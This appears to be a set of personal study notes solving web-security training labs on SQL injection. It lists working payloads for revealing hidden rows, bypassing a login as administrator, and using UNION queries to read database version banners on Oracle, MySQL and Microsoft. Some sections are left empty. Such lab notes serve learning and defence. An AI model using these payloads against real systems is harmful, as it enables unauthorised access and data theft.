## How to:

### 1. To test the DB use: `DUAL` Table in Oracle.
### 2. Can perform SQLI without Union:
  - Manipulating WHERE clauses.
  - Commenting out the remaining query
  - Subqueries
### 3. 




## Solution:
- Lab 1: Retrieval of Hidden Data(Where): `Modify the category parameter, giving it the value '+OR+1=1--`
- Lab 2: SQL injection vulnerability allowing login bypass: `Modify the username parameter, giving it the value: administrator'--` or `enter ' OR 1=1-- in username & pwd field`
- Lab 3: Querying the database type and version on Oracle:
      - Verify the `number of columns` that are being returned by the query and which columns contain text data `'Union SELECT 'NULL','NULL' FROM DUAL--`
      - Add the Payload in URL `'UNION+SELECT+banner,NULL+FROM+v$version--`

- Lab 4: Querying the database type and version on MySQL and Microsoft:
      - Verify the `number of columns` that are being returned by the query and which columns contain text data `'Union+SELECT+NULL+NULL#`,`# to Comment out in MySQL`
      - Add the Payload in URL 'Union+SELECT+@@version,NULL#

- Lab 5: 













